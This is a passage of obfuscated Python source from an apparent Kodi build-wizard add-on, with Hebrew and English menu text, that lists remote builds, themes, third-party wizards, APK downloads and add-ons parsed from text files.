	addFile ('[COLOR %s]Location:[/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR1 ,COLOR2 ,OOO00000O000OOOOO ),'',icon =ICONMAINT ,themeit =THEME2 )#line:2181
	addFile ('[COLOR %s]MacAddress:[/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR1 ,COLOR2 ,OO00O00O000O0OOO0 [5 ]),'',icon =ICONMAINT ,themeit =THEME2 )#line:2182
	setView ('files','viewType')#line:2183
def buildMenu ():#line:2185
	if USERNAME =='':#line:2186
		ADDON .openSettings ()#line:2187
		sys .exit ()#line:2188
	if PASSWORD =='':#line:2189
		ADDON .openSettings ()#line:2190
	O00O0OO0O0O00O0O0 =u_list (SPEEDFILE )#line:2191
	(O00O0OO0O0O00O0O0 )#line:2192
	OO000000OO0OO000O =(wiz .workingURL (O00O0OO0O0O00O0O0 ))#line:2193
	(OO000000OO0OO000O )#line:2194
	OO000000OO0OO000O =wiz .workingURL (SPEEDFILE )#line:2195
	if not OO000000OO0OO000O ==True :#line:2196
		addFile ('%s גירסה: %s'%(MCNAME ,KODIV ),'',icon =ICONBUILDS ,themeit =THEME3 )#line:2197
		addDir ('כניסה לשמירת נתונים','savedata',icon =ICONSAVE ,themeit =THEME3 )#line:2198
		if HIDESPACERS =='No':addFile (wiz .sep (),'',themeit =THEME3 )#line:2199
		addFile ('בילדים לא זמינים אנא בדוק את חיבור האינטרנט','',icon =ICONBUILDS ,themeit =THEME3 )#line:2200
		addFile ('%s'%OO000000OO0OO000O ,'',icon =ICONBUILDS ,themeit =THEME3 )#line:2201
	else :#line:2202
		O0OO0OO0OOO00O00O ,O0000OO0OO000OO00 ,OOOOOO0OOO0O0O0OO ,O0O0O0O000OO0OO00 ,OO00000000OOOO00O ,OO0OOO00OO00OOOOO ,OO00O00OOOOO00OOO =wiz .buildCount ()#line:2203
		OO00OO00OO0O000O0 =False ;OOO0O0O0000OO0OO0 =[]#line:2204
		if THIRDPARTY =='true':#line:2205
			if not THIRD1NAME ==''and not THIRD1URL =='':OO00OO00OO0O000O0 =True ;OOO0O0O0000OO0OO0 .append ('1')#line:2206
			if not THIRD2NAME ==''and not THIRD2URL =='':OO00OO00OO0O000O0 =True ;OOO0O0O0000OO0OO0 .append ('2')#line:2207
			if not THIRD3NAME ==''and not THIRD3URL =='':OO00OO00OO0O000O0 =True ;OOO0O0O0000OO0OO0 .append ('3')#line:2208
		OOO00OOOOOOOO0OO0 =wiz .openURL (SPEEDFILE ).replace ('\n','').replace ('\r','').replace ('\t','').replace ('gui=""','gui="http://"').replace ('theme=""','theme="http://"').replace ('adult=""','adult="no"')#line:2209
		OO0O00000O0O0OO0O =re .compile ('name="(.+?)".+?ersion="(.+?)".+?rl="(.+?)".+?ui="(.+?)".+?odi="(.+?)".+?heme="(.+?)".+?con="(.+?)".+?anart="(.+?)".+?dult="(.+?)".+?escription="(.+?)"').findall (OOO00OOOOOOOO0OO0 )#line:2210
		if O0OO0OO0OOO00O00O ==1 and OO00OO00OO0O000O0 ==False :#line:2211
			for O0O0OOO0OOOOOO0OO ,O00O000O0000OO00O ,O0OO0OO0000O00000 ,OO000OO0O0O000OOO ,O0O000O00O000O0O0 ,O0OOO0OO0O0000000 ,O0OO00OO00O0O0O00 ,OO0OOOOO0OO0OO0O0 ,O000OOO0OO0OO0O00 ,O0000000000OO0OO0 in OO0O00000O0O0OO0O :#line:2212
				if not SHOWADULT =='true'and O000OOO0OO0OO0O00 .lower ()=='yes':continue #line:2213
				if not DEVELOPER =='true'and wiz .strTest (O0O0OOO0OOOOOO0OO ):continue #line:2214
				viewBuild (OO0O00000O0O0OO0O [0 ][0 ])#line:2215
				return #line:2216
		addFile ('עדכון מהיר','fastupdate',icon =ICONSAVE ,themeit =THEME1 )#line:2219
		if HIDESPACERS =='No':addFile (wiz .sep (),'',themeit =THEME3 )#line:2220
		if OO00OO00OO0O000O0 ==True :#line:2221
			for O00000O0OO00OOO00 in OOO0O0O0000OO0OO0 :#line:2222
				O0O0OOO0OOOOOO0OO =eval ('THIRD%sNAME'%O00000O0OO00OOO00 )#line:2223
		if len (OO0O00000O0O0OO0O )>=1 :#line:2225
			if SEPERATE =='true':#line:2226
				for O0O0OOO0OOOOOO0OO ,O00O000O0000OO00O ,O0OO0OO0000O00000 ,OO000OO0O0O000OOO ,O0O000O00O000O0O0 ,O0OOO0OO0O0000000 ,O0OO00OO00O0O0O00 ,OO0OOOOO0OO0OO0O0 ,O000OOO0OO0OO0O00 ,O0000000000OO0OO0 in OO0O00000O0O0OO0O :#line:2227
					if not SHOWADULT =='true'and O000OOO0OO0OO0O00 .lower ()=='yes':continue #line:2228
					if not DEVELOPER =='true'and wiz .strTest (O0O0OOO0OOOOOO0OO ):continue #line:2229
					OOO0000000OO00000 =createMenu ('install','',O0O0OOO0OOOOOO0OO )#line:2230
					addDir ('[%s] %s (v%s)'%(float (O0O000O00O000O0O0 ),O0O0OOO0OOOOOO0OO ,O00O000O0000OO00O ),'viewbuild',O0O0OOO0OOOOOO0OO ,description =O0000000000OO0OO0 ,fanart =OO0OOOOO0OO0OO0O0 ,icon =O0OO00OO00O0O0O00 ,menu =OOO0000000OO00000 ,themeit =THEME2 )#line:2231
			else :#line:2232
				if O0O0O0O000OO0OO00 >0 :#line:2233
					OOOOO0O0O0OOOO00O ='+'if SHOW17 =='false'else '-'#line:2234
					if SHOW17 =='true':#line:2236
						for O0O0OOO0OOOOOO0OO ,O00O000O0000OO00O ,O0OO0OO0000O00000 ,OO000OO0O0O000OOO ,O0O000O00O000O0O0 ,O0OOO0OO0O0000000 ,O0OO00OO00O0O0O00 ,OO0OOOOO0OO0OO0O0 ,O000OOO0OO0OO0O00 ,O0000000000OO0OO0 in OO0O00000O0O0OO0O :#line:2238
							if not SHOWADULT =='true'and O000OOO0OO0OO0O00 .lower ()=='yes':continue #line:2239
							if not DEVELOPER =='true'and wiz .strTest (O0O0OOO0OOOOOO0OO ):continue #line:2240
							OOO000O0000OO0O0O =int (float (O0O000O00O000O0O0 ))#line:2241
							if OOO000O0000OO0O0O ==17 :#line:2242
								OOO0000000OO00000 =createMenu ('install','',O0O0OOO0OOOOOO0OO )#line:2243
								addDir ('[%s] %s (v%s)'%(float (O0O000O00O000O0O0 ),O0O0OOO0OOOOOO0OO ,O00O000O0000OO00O ),'viewbuild',O0O0OOO0OOOOOO0OO ,description =O0000000000OO0OO0 ,fanart =OO0OOOOO0OO0OO0O0 ,icon =O0OO00OO00O0O0O00 ,menu =OOO0000000OO00000 ,themeit =THEME2 )#line:2244
				if OO00000000OOOO00O >0 :#line:2245
					OOOOO0O0O0OOOO00O ='+'if SHOW18 =='false'else '-'#line:2246
					if SHOW18 =='true':#line:2248
						for O0O0OOO0OOOOOO0OO ,O00O000O0000OO00O ,O0OO0OO0000O00000 ,OO000OO0O0O000OOO ,O0O000O00O000O0O0 ,O0OOO0OO0O0000000 ,O0OO00OO00O0O0O00 ,OO0OOOOO0OO0OO0O0 ,O000OOO0OO0OO0O00 ,O0000000000OO0OO0 in OO0O00000O0O0OO0O :#line:2250
							if not SHOWADULT =='true'and O000OOO0OO0OO0O00 .lower ()=='yes':continue #line:2251
							if not DEVELOPER =='true'and wiz .strTest (O0O0OOO0OOOOOO0OO ):continue #line:2252
							OOO000O0000OO0O0O =int (float (O0O000O00O000O0O0 ))#line:2253
							if OOO000O0000OO0O0O ==18 :#line:2254
								OOO0000000OO00000 =createMenu ('install','',O0O0OOO0OOOOOO0OO )#line:2255
								addDir ('[%s] %s (v%s)'%(float (O0O000O00O000O0O0 ),O0O0OOO0OOOOOO0OO ,O00O000O0000OO00O ),'viewbuild',O0O0OOO0OOOOOO0OO ,description =O0000000000OO0OO0 ,fanart =OO0OOOOO0OO0OO0O0 ,icon =O0OO00OO00O0O0O00 ,menu =OOO0000000OO00000 ,themeit =THEME2 )#line:2256
				if OOOOOO0OOO0O0O0OO >0 :#line:2257
					OOOOO0O0O0OOOO00O ='+'if SHOW16 =='false'else '-'#line:2258
					addFile ('[B]%s Jarvis Builds(%s)[/B]'%(OOOOO0O0O0OOOO00O ,OOOOOO0OOO0O0O0OO ),'togglesetting','show16',themeit =THEME3 )#line:2259
					if SHOW16 =='true':#line:2260
						for O0O0OOO0OOOOOO0OO ,O00O000O0000OO00O ,O0OO0OO0000O00000 ,OO000OO0O0O000OOO ,O0O000O00O000O0O0 ,O0OOO0OO0O0000000 ,O0OO00OO00O0O0O00 ,OO0OOOOO0OO0OO0O0 ,O000OOO0OO0OO0O00 ,O0000000000OO0OO0 in OO0O00000O0O0OO0O :#line:2261
							if not SHOWADULT =='true'and O000OOO0OO0OO0O00 .lower ()=='yes':continue #line:2262
							if not DEVELOPER =='true'and wiz .strTest (O0O0OOO0OOOOOO0OO ):continue #line:2263
							OOO000O0000OO0O0O =int (float (O0O000O00O000O0O0 ))#line:2264
							if OOO000O0000OO0O0O ==16 :#line:2265
								OOO0000000OO00000 =createMenu ('install','',O0O0OOO0OOOOOO0OO )#line:2266
								addDir ('[%s] %s (v%s)'%(float (O0O000O00O000O0O0 ),O0O0OOO0OOOOOO0OO ,O00O000O0000OO00O ),'viewbuild',O0O0OOO0OOOOOO0OO ,description =O0000000000OO0OO0 ,fanart =OO0OOOOO0OO0OO0O0 ,icon =O0OO00OO00O0O0O00 ,menu =OOO0000000OO00000 ,themeit =THEME2 )#line:2267
				if O0000OO0OO000OO00 >0 :#line:2268
					OOOOO0O0O0OOOO00O ='+'if SHOW15 =='false'else '-'#line:2269
					addFile ('[B]%s Isengard and Below Builds(%s)[/B]'%(OOOOO0O0O0OOOO00O ,O0000OO0OO000OO00 ),'togglesetting','show15',themeit =THEME3 )#line:2270
					if SHOW15 =='true':#line:2271
						for O0O0OOO0OOOOOO0OO ,O00O000O0000OO00O ,O0OO0OO0000O00000 ,OO000OO0O0O000OOO ,O0O000O00O000O0O0 ,O0OOO0OO0O0000000 ,O0OO00OO00O0O0O00 ,OO0OOOOO0OO0OO0O0 ,O000OOO0OO0OO0O00 ,O0000000000OO0OO0 in OO0O00000O0O0OO0O :#line:2272
							if not SHOWADULT =='true'and O000OOO0OO0OO0O00 .lower ()=='yes':continue #line:2273
							if not DEVELOPER =='true'and wiz .strTest (O0O0OOO0OOOOOO0OO ):continue #line:2274
							OOO000O0000OO0O0O =int (float (O0O000O00O000O0O0 ))#line:2275
							if OOO000O0000OO0O0O <=15 :#line:2276
								OOO0000000OO00000 =createMenu ('install','',O0O0OOO0OOOOOO0OO )#line:2277
								addDir ('[%s] %s (v%s)'%(float (O0O000O00O000O0O0 ),O0O0OOO0OOOOOO0OO ,O00O000O0000OO00O ),'viewbuild',O0O0OOO0OOOOOO0OO ,description =O0000000000OO0OO0 ,fanart =OO0OOOOO0OO0OO0O0 ,icon =O0OO00OO00O0O0O00 ,menu =OOO0000000OO00000 ,themeit =THEME2 )#line:2278
		elif OO00O00OOOOO00OOO >0 :#line:2279
			if OO0OOO00OO00OOOOO >0 :#line:2280
				addFile ('There is currently only Adult builds','',icon =ICONBUILDS ,themeit =THEME3 )#line:2281
				addFile ('Enable Show Adults in Addon Settings > Misc','',icon =ICONBUILDS ,themeit =THEME3 )#line:2282
			else :#line:2283
				addFile ('Currently No Builds Offered from %s'%ADDONTITLE ,'',icon =ICONBUILDS ,themeit =THEME3 )#line:2284
		else :addFile ('Text file for builds not formated correctly.','',icon =ICONBUILDS ,themeit =THEME3 )#line:2285
	setView ('files','viewType')#line:2286
def viewBuild (OOOOOO000000O0OO0 ):#line:2288
	OOO0000000O00OOOO =wiz .workingURL (SPEEDFILE )#line:2289
	if not OOO0000000O00OOOO ==True :#line:2290
		addFile ('בילדים לא זמינים אנא בדוק את חיבור האינטרנט','',themeit =THEME3 )#line:2291
		addFile ('%s'%OOO0000000O00OOOO ,'',themeit =THEME3 )#line:2292
		return #line:2293
	if wiz .checkBuild (OOOOOO000000O0OO0 ,'version')==False :#line:2294
		addFile ('Error reading the txt file.','',themeit =THEME3 )#line:2295
		addFile ('%s was not found in the builds list.'%OOOOOO000000O0OO0 ,'',themeit =THEME3 )#line:2296
		return #line:2297
	OOOOOO0OOOO0OOO00 =wiz .openURL (SPEEDFILE ).replace ('\n','').replace ('\r','').replace ('\t','').replace ('gui=""','gui="http://"').replace ('theme=""','theme="http://"')#line:2298
	O0O0O00OO000O0OOO =re .compile ('name="%s".+?ersion="(.+?)".+?rl="(.+?)".+?ui="(.+?)".+?odi="(.+?)".+?heme="(.+?)".+?con="(.+?)".+?anart="(.+?)".+?review="(.+?)".+?dult="(.+?)".+?escription="(.+?)"'%OOOOOO000000O0OO0 ).findall (OOOOOO0OOOO0OOO00 )#line:2299
	for OOOOOOO00OO00OOOO ,OO0OO0O00O00OO00O ,O00OO0OOO00OO00OO ,OO0000O00OO0OO0O0 ,O00O0O0OO000O000O ,OOOOOOO0O00OO00OO ,OO000OO0O0OO000OO ,O00OO00OO00O0OOOO ,OO00O0OOOO000OOO0 ,O00O00OO0O0O0OO0O in O0O0O00OO000O0OOO :#line:2300
		OOOOOOO0O00OO00OO =OOOOOOO0O00OO00OO if wiz .workingURL (OOOOOOO0O00OO00OO )else ICON #line:2301
		OO000OO0O0OO000OO =OO000OO0O0OO000OO if wiz .workingURL (OO000OO0O0OO000OO )else FANART #line:2302
		O0000OO0OO00O0000 ='%s (v%s)'%(OOOOOO000000O0OO0 ,OOOOOOO00OO00OOOO )#line:2303
		if BUILDNAME ==OOOOOO000000O0OO0 and OOOOOOO00OO00OOOO >BUILDVERSION :#line:2304
			O0000OO0OO00O0000 ='%s [COLOR red][CURRENT v%s][/COLOR]'%(O0000OO0OO00O0000 ,BUILDVERSION )#line:2305
		OO0O0OO00O0OOO000 =int (float (KODIV ));OOOO000O00OOO0O0O =int (float (OO0000O00OO0OO0O0 ))#line:2314
		if not OO0O0OO00O0OOO000 ==OOOO000O00OOO0O0O :#line:2315
			if OO0O0OO00O0OOO000 ==16 and OOOO000O00OOO0O0O <=15 :O0OO0OO0O00O0OO00 =False #line:2316
			else :O0OO0OO0O00O0OO00 =True #line:2317
		else :O0OO0OO0O00O0OO00 =False #line:2318
		addFile ('התקנה','install',OOOOOO000000O0OO0 ,'fresh',description =O00O00OO0O0O0OO0O ,fanart =OO000OO0O0OO000OO ,icon =OOOOOOO0O00OO00OO ,themeit =THEME1 )#line:2322
		if not O00O0O0OO000O000O =='http://':#line:2325
			if wiz .workingURL (O00O0O0OO000O000O )==True :#line:2326
				addFile (wiz .sep ('THEMES'),'',fanart =OO000OO0O0OO000OO ,icon =OOOOOOO0O00OO00OO ,themeit =THEME3 )#line:2327
				OOOOOO0OOOO0OOO00 =wiz .openURL (O00O0O0OO000O000O ).replace ('\n','').replace ('\r','').replace ('\t','')#line:2328
				O0O0O00OO000O0OOO =re .compile ('name="(.+?)".+?rl="(.+?)".+?con="(.+?)".+?anart="(.+?)".+?dult="(.+?)".+?escription="(.+?)"').findall (OOOOOO0OOOO0OOO00 )#line:2329
				for OOOOOO0O0OOOOOOO0 ,OO0OO000OOOOOOO0O ,OO0OOO0OO0O0O00O0 ,OOOOO0O00000OOO00 ,O0O00OO00O00OOO0O ,O00O00OO0O0O0OO0O in O0O0O00OO000O0OOO :#line:2330
					if not SHOWADULT =='true'and O0O00OO00O00OOO0O .lower ()=='yes':continue #line:2331
					OO0OOO0OO0O0O00O0 =OO0OOO0OO0O0O00O0 if OO0OOO0OO0O0O00O0 =='http://'else OOOOOOO0O00OO00OO #line:2332
					OOOOO0O00000OOO00 =OOOOO0O00000OOO00 if OOOOO0O00000OOO00 =='http://'else OO000OO0O0OO000OO #line:2333
					addFile (OOOOOO0O0OOOOOOO0 if not OOOOOO0O0OOOOOOO0 ==BUILDTHEME else "[B]%s (Installed)[/B]"%OOOOOO0O0OOOOOOO0 ,'theme',OOOOOO000000O0OO0 ,OOOOOO0O0OOOOOOO0 ,description =O00O00OO0O0O0OO0O ,fanart =OOOOO0O00000OOO00 ,icon =OO0OOO0OO0O0O00O0 ,themeit =THEME3 )#line:2334
	setView ('files','viewType')#line:2335
def viewThirdList (OO0O00000000000OO ):#line:2337
	O0O00O0OOO0OOOOOO =eval ('THIRD%sNAME'%OO0O00000000000OO )#line:2338
	OO0O0OO0OO000OO00 =eval ('THIRD%sURL'%OO0O00000000000OO )#line:2339
	OOO00O0OO0OOOO0O0 =wiz .workingURL (OO0O0OO0OO000OO00 )#line:2340
	if not OOO00O0OO0OOOO0O0 ==True :#line:2341
		addFile ('Url for txt file not valid','',icon =ICONBUILDS ,themeit =THEME3 )#line:2342
		addFile ('%s'%WORKINGURL ,'',icon =ICONBUILDS ,themeit =THEME3 )#line:2343
	else :#line:2344
		OOO000O0OO0OOOO0O ,O000OO000OOO0O0OO =wiz .thirdParty (OO0O0OO0OO000OO00 )#line:2345
		addFile ("[B]%s[/B]"%O0O00O0OOO0OOOOOO ,'',themeit =THEME3 )#line:2346
		if HIDESPACERS =='No':addFile (wiz .sep (),'',themeit =THEME3 )#line:2347
		if OOO000O0OO0OOOO0O :#line:2348
			for O0O00O0OOO0OOOOOO ,OO00OOO0O0000O00O ,OO0O0OO0OO000OO00 ,OO000OOOOOO0000OO ,O0OO0O00OOO0O0OO0 ,OOO0OOO0O00OO0OO0 ,OOOOOO0O0O00OO000 ,O0O0OO0O00O0000O0 in O000OO000OOO0O0OO :#line:2349
				if not SHOWADULT =='true'and OOOOOO0O0O00OO000 .lower ()=='yes':continue #line:2350
				addFile ("[%s] %s v%s"%(OO000OOOOOO0000OO ,O0O00O0OOO0OOOOOO ,OO00OOO0O0000O00O ),'installthird',O0O00O0OOO0OOOOOO ,OO0O0OO0OO000OO00 ,icon =O0OO0O00OOO0O0OO0 ,fanart =OOO0OOO0O00OO0OO0 ,description =O0O0OO0O00O0000O0 ,themeit =THEME2 )#line:2351
		else :#line:2352
			for O0O00O0OOO0OOOOOO ,OO0O0OO0OO000OO00 ,O0OO0O00OOO0O0OO0 ,OOO0OOO0O00OO0OO0 ,O0O0OO0O00O0000O0 in O000OO000OOO0O0OO :#line:2353
				addFile (O0O00O0OOO0OOOOOO ,'installthird',O0O00O0OOO0OOOOOO ,OO0O0OO0OO000OO00 ,icon =O0OO0O00OOO0O0OO0 ,fanart =OOO0OOO0O00OO0OO0 ,description =O0O0OO0O00O0000O0 ,themeit =THEME2 )#line:2354
def editThirdParty (OOO0O0O0OO0OO00O0 ):#line:2356
	O0O0OOO000OO00OOO =eval ('THIRD%sNAME'%OOO0O0O0OO0OO00O0 )#line:2357
	OOO00OOO0O0OO0O00 =eval ('THIRD%sURL'%OOO0O0O0OO0OO00O0 )#line:2358
	OO0O0000O0000OOO0 =wiz .getKeyboard (O0O0OOO000OO00OOO ,'Enter the Name of the Wizard')#line:2359
	OO000OO0O00OO0O00 =wiz .getKeyboard (OOO00OOO0O0OO0O00 ,'Enter the URL of the Wizard Text')#line:2360
	wiz .setS ('wizard%sname'%OOO0O0O0OO0OO00O0 ,OO0O0000O0000OOO0 )#line:2362
	wiz .setS ('wizard%surl'%OOO0O0O0OO0OO00O0 ,OO000OO0O00OO0O00 )#line:2363
def apkScraper (name =""):#line:2365
	if name =='kodi':#line:2366
		O0OO0000OO00O0O00 ='http://mirrors.kodi.tv/releases/android/arm/'#line:2367
		OO00O00O00O0000O0 ='http://mirrors.kodi.tv/releases/android/arm/old/'#line:2368
		O000OO0OOO00O0OO0 =wiz .openURL (O0OO0000OO00O0O00 ).replace ('\n','').replace ('\r','').replace ('\t','')#line:2369
		OO0O0OO00O000000O =wiz .openURL (OO00O00O00O0000O0 ).replace ('\n','').replace ('\r','').replace ('\t','')#line:2370
		OOOO0OOO0O00OO00O =0 #line:2371
		O0O0OOO000O0OOO0O =re .compile ('<tr><td><a href="(.+?)">(.+?)</a></td><td>(.+?)</td><td>(.+?)</td></tr>').findall (O000OO0OOO00O0OO0 )#line:2372
		O000O0OO0OOOO0O00 =re .compile ('<tr><td><a href="(.+?)">(.+?)</a></td><td>(.+?)</td><td>(.+?)</td></tr>').findall (OO0O0OO00O000000O )#line:2373
		addFile ("Official Kodi Apk\'s",themeit =THEME1 )#line:2375
		OOO0O0OOO00O00O00 =False #line:2376
		for OO00OOOOO000O0OOO ,name ,OOOO000O00O0O00O0 ,O0OOO00O0000O0O0O in O0O0OOO000O0OOO0O :#line:2377
			if OO00OOOOO000O0OOO in ['../','old/']:continue #line:2378
			if not OO00OOOOO000O0OOO .endswith ('.apk'):continue #line:2379
			if not OO00OOOOO000O0OOO .find ('_')==-1 and OOO0O0OOO00O00O00 ==True :continue #line:2380
			try :#line:2381
				O00OO0O0OOOOOOO0O =name .split ('-')#line:2382
				if not OO00OOOOO000O0OOO .find ('_')==-1 :#line:2383
					OOO0O0OOO00O00O00 =True #line:2384
					OO000O0O00000OO0O ,O00O00O00O0000000 =O00OO0O0OOOOOOO0O [2 ].split ('_')#line:2385
				else :#line:2386
					OO000O0O00000OO0O =O00OO0O0OOOOOOO0O [2 ]#line:2387
					O00O00O00O0000000 =''#line:2388
				OOOOO0O0O000OOO00 ="[COLOR %s]%s v%s%s %s[/COLOR] [COLOR %s]%s[/COLOR] [COLOR %s]%s[/COLOR]"%(COLOR1 ,O00OO0O0OOOOOOO0O [0 ].title (),O00OO0O0OOOOOOO0O [1 ],O00O00O00O0000000 .upper (),OO000O0O00000OO0O ,COLOR2 ,OOOO000O00O0O00O0 .replace (' ',''),COLOR1 ,O0OOO00O0000O0O0O )#line:2389
				O0OO0OOOO000OO0O0 =urljoin (O0OO0000OO00O0O00 ,OO00OOOOO000O0OOO )#line:2390
				addFile (OOOOO0O0O000OOO00 ,'apkinstall',"%s v%s%s %s"%(O00OO0O0OOOOOOO0O [0 ].title (),O00OO0O0OOOOOOO0O [1 ],O00O00O00O0000000 .upper (),OO000O0O00000OO0O ),O0OO0OOOO000OO0O0 )#line:2391
				OOOO0OOO0O00OO00O +=1 #line:2392
			except :#line:2393
				wiz .log ("Error on: %s"%name )#line:2394
		for OO00OOOOO000O0OOO ,name ,OOOO000O00O0O00O0 ,O0OOO00O0000O0O0O in O000O0OO0OOOO0O00 :#line:2396
			if OO00OOOOO000O0OOO in ['../','old/']:continue #line:2397
			if not OO00OOOOO000O0OOO .endswith ('.apk'):continue #line:2398
			if not OO00OOOOO000O0OOO .find ('_')==-1 :continue #line:2399
			try :#line:2400
				O00OO0O0OOOOOOO0O =name .split ('-')#line:2401
				OOOOO0O0O000OOO00 ="[COLOR %s]%s v%s %s[/COLOR] [COLOR %s]%s[/COLOR] [COLOR %s]%s[/COLOR]"%(COLOR1 ,O00OO0O0OOOOOOO0O [0 ].title (),O00OO0O0OOOOOOO0O [1 ],O00OO0O0OOOOOOO0O [2 ],COLOR2 ,OOOO000O00O0O00O0 .replace (' ',''),COLOR1 ,O0OOO00O0000O0O0O )#line:2402
				O0OO0OOOO000OO0O0 =urljoin (OO00O00O00O0000O0 ,OO00OOOOO000O0OOO )#line:2403
				addFile (OOOOO0O0O000OOO00 ,'apkinstall',"%s v%s %s"%(O00OO0O0OOOOOOO0O [0 ].title (),O00OO0O0OOOOOOO0O [1 ],O00OO0O0OOOOOOO0O [2 ]),O0OO0OOOO000OO0O0 )#line:2404
				OOOO0OOO0O00OO00O +=1 #line:2405
			except :#line:2406
				wiz .log ("Error on: %s"%name )#line:2407
		if OOOO0OOO0O00OO00O ==0 :addFile ("Error Kodi Scraper Is Currently Down.")#line:2408
	elif name =='spmc':#line:2409
		OOO0O0OO00OO00O0O ='https://github.com/koying/SPMC/releases'#line:2410
		O000OO0OOO00O0OO0 =wiz .openURL (OOO0O0OO00OO00O0O ).replace ('\n','').replace ('\r','').replace ('\t','')#line:2411
		OOOO0OOO0O00OO00O =0 #line:2412
		O0O0OOO000O0OOO0O =re .compile ('<div.+?lass="release-body.+?div class="release-header".+?a href=.+?>(.+?)</a>.+?ul class="release-downloads">(.+?)</ul>.+?/div>').findall (O000OO0OOO00O0OO0 )#line:2413
		addFile ("Official SPMC Apk\'s",themeit =THEME1 )#line:2415
		for name ,O00O0000O0O0OOOO0 in O0O0OOO000O0OOO0O :#line:2417
			OO00O000OO00OOO0O =''#line:2418
			O000O0OO0OOOO0O00 =re .compile ('<li>.+?<a href="(.+?)" rel="nofollow">.+?<small class="text-gray float-right">(.+?)</small>.+?strong>(.+?)</strong>.+?</a>.+?</li>').findall (O00O0000O0O0OOOO0 )#line:2419
			for O0O0OO00O00000O00 ,O0O00OO00OO000OO0 ,OO000OOOOO0OOO000 in O000O0OO0OOOO0O00 :#line:2420
				if OO000OOOOO0OOO000 .find ('armeabi')==-1 :continue #line:2421
				if OO000OOOOO0OOO000 .find ('launcher')>-1 :continue #line:2422
				OO00O000OO00OOO0O =urljoin ('https://github.com',O0O0OO00O00000O00 )#line:2423
				break #line:2424
		if OOOO0OOO0O00OO00O ==0 :addFile ("Error SPMC Scraper Is Currently Down.")#line:2426
def apkMenu (url =None ):#line:2428
	if url ==None :#line:2429
		if HIDESPACERS =='No':addFile (wiz .sep (),'',themeit =THEME3 )#line:2432
	if not APKFILE =='http://':#line:2433
		if url ==None :#line:2434
			OOO0OO00O0OO0O000 =wiz .workingURL (APKFILE )#line:2435
			OO0OO0OOO00OOO0OO =uservar .APKFILE #line:2436
		else :#line:2437
			OOO0OO00O0OO0O000 =wiz .workingURL (url )#line:2438
			OO0OO0OOO00OOO0OO =url #line:2439
		if OOO0OO00O0OO0O000 ==True :#line:2440
			O0OOOOOOOO0OOOOO0 =wiz .openURL (OO0OO0OOO00OOO0OO ).replace ('\n','').replace ('\r','').replace ('\t','')#line:2441
			O0O0O0OO00OOOOO0O =re .compile ('name="(.+?)".+?ection="(.+?)".+?rl="(.+?)".+?con="(.+?)".+?anart="(.+?)".+?dult="(.+?)".+?escription="(.+?)"').findall (O0OOOOOOOO0OOOOO0 )#line:2442
			if len (O0O0O0OO00OOOOO0O )>0 :#line:2443
				OOO0OOOO0OO00OOO0 =0 #line:2444
				for O00O0OOO0OOO000O0 ,OO00OOOOOOO0OOO00 ,url ,OO00O000000O0O0O0 ,O0O0O000O000O000O ,OOOO000000O0O0O0O ,OOO00O00OOOOOO00O in O0O0O0OO00OOOOO0O :#line:2445
					if not SHOWADULT =='true'and OOOO000000O0O0O0O .lower ()=='yes':continue #line:2446
					if OO00OOOOOOO0OOO00 .lower ()=='yes':#line:2447
						OOO0OOOO0OO00OOO0 +=1 #line:2448
						addDir ("[B]%s[/B]"%O00O0OOO0OOO000O0 ,'apk',url ,description =OOO00O00OOOOOO00O ,icon =OO00O000000O0O0O0 ,fanart =O0O0O000O000O000O ,themeit =THEME3 )#line:2449
					else :#line:2450
						OOO0OOOO0OO00OOO0 +=1 #line:2451
						addFile (O00O0OOO0OOO000O0 ,'apkinstall',O00O0OOO0OOO000O0 ,url ,description =OOO00O00OOOOOO00O ,icon =OO00O000000O0O0O0 ,fanart =O0O0O000O000O000O ,themeit =THEME2 )#line:2452
					if OOO0OOOO0OO00OOO0 <1 :#line:2453
						addFile ("No addons added to this menu yet!",'',themeit =THEME2 )#line:2454
			else :wiz .log ("[APK Menu] ERROR: Invalid Format.",xbmc .LOGERROR )#line:2455
		else :#line:2456
			wiz .log ("[APK Menu] ERROR: URL for apk list not working.",xbmc .LOGERROR )#line:2457
			addFile ('Url for txt file not valid','',themeit =THEME3 )#line:2458
			addFile ('%s'%OOO0OO00O0OO0O000 ,'',themeit =THEME3 )#line:2459
		return #line:2460
	else :wiz .log ("[APK Menu] No APK list added.")#line:2461
	setView ('files','viewType')#line:2462
def addonMenu (url =None ):#line:2464
	if not ADDONFILE =='http://':#line:2465
		if url ==None :#line:2466
			OOOOOO00OOO0OOOO0 =wiz .workingURL (ADDONFILE )#line:2467
			OOO0000000O0O0000 =uservar .ADDONFILE #line:2468
		else :#line:2469
			OOOOOO00OOO0OOOO0 =wiz .workingURL (url )#line:2470
			OOO0000000O0O0000 =url #line:2471
		if OOOOOO00OOO0OOOO0 ==True :#line:2472
			OOOOO0O00000O000O =wiz .openURL (OOO0000000O0O0000 ).replace ('\n','').replace ('\r','').replace ('\t','').replace ('repository=""','repository="none"').replace ('repositoryurl=""','repositoryurl="http://"').replace ('repositoryxml=""','repositoryxml="http://"')#line:2473
			O00O0O0O00OO0OOO0 =re .compile ('name="(.+?)".+?lugin="(.+?)".+?rl="(.+?)".+?epository="(.+?)".+?epositoryxml="(.+?)".+?epositoryurl="(.+?)".+?con="(.+?)".+?anart="(.+?)".+?dult="(.+?)".+?escription="(.+?)"').findall (OOOOO0O00000O000O )#line:2474
			if len (O00O0O0O00OO0OOO0 )>0 :#line:2475
				O0OO0O0O0OO0OOOOO =0 #line:2476
				for OOOOO0OO0OO0O0OO0 ,O0000OOO0OOO0OO0O ,url ,O00O00OOO00O0O0O0 ,OO0OOO0OO0O0O0OO0 ,OOO0000O0000O0OO0 ,O00OO0OO0OO00OOO0 ,O0O0OOOO0000O0000 ,OO0000OO0O00O0000 ,OOO0O000OOOOO00OO in O00O0O0O00OO0OOO0 :#line:2477
					if O0000OOO0OOO0OO0O .lower ()=='section':#line:2478
						O0OO0O0O0OO0OOOOO +=1 #line:2479
						addDir ("[B]%s[/B]"%OOOOO0OO0OO0O0OO0 ,'addons',url ,description =OOO0O000OOOOO00OO ,icon =O00OO0OO0OO00OOO0 ,fanart =O0O0OOOO0000O0000 ,themeit =THEME3 )#line:2480
					else :#line:2481
						if not SHOWADULT =='true'and OO0000OO0O00O0000 .lower ()=='yes':continue #line:2482
						try :#line:2483
							OO0000O0O000O0O0O =xbmcaddon .Addon (id =O0000OOO0OOO0OO0O ).getAddonInfo ('path')#line:2484
							if os .path .exists (OO0000O0O000O0O0O ):#line:2485
